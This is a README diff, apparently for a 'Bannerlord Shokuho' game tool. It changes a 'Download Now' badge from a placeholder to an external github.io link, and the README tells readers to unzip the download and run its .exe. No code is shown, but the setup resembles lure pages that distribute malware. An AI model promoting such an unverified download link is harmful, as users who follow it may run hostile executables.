@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://bannerlord-shokuho.github.io/.github/)
 
 ## 📸 Overview
 ![bannerlord-shokuho-clans](https://github.com/user-attachments/assets/ccd33dc0-78cf-4ce8-8218-98e56284f65d)
